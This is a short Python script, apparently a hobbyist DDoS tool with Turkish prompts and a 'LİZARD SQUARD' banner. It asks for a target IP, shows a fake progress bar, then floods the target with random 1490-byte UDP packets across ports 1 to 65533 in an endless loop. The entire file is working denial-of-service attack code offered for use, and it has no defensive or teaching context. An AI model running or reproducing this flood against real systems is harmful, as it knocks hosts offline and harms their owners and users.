import os
import socket
import random
import requests
import time
from colorama import Fore, Style
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")

print(Fore.RED + """
      ┌─────────────────────────────────────────────────┐
      │         _          ____      _                  │
      │        | |        |  _ \  __| | ___  ___        │
      │        | |   _____| | | |/ _` |/ _ \/ __|       │
      │        | |__|_____| |_| | (_| | (_) \__ \       │
      │        |_____|    |____/ \__,_|\___/|___/       │
      │                                                 │
      └─────────────────────────────────────────────────┘
""")

ip = input("IP Gir : ")
port = input("Porta girin: ")
os.system("figlet DdoS Attack")
print("Team : LİZARD SQUARD")
print("\033[92m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0


while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mPaket \033[1;32m%s \033[1;91mGönderiliyor \033[1;32m%s \033[1;91mPort Sayısı \033[1;32m%s " % (sent, ip, port,))